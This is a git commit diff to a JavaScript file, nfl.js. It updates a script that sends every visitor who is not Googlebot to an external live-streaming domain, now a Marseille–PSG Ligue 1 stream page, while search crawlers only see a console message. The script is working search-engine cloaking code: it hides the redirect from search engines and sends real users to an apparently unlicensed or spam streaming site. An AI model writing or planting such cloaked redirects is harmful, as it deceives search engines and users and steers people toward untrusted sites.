6f916427d13986e7a16266c214036c3c786633c0
mayfuas78-ship-it <mayfuas78@gmail.com>
2026-09-21 00:29:20 +0600

    Update nfl.js

--- java/nfl.js
+++ java/nfl.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://sdhsaatv.pro/nfl-live/?now";
+  window.location.href = "https://sdhsaatv.pro/ligue1/?m=Marseille%20-%20PSG%20En%20Direct%20Streaming";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
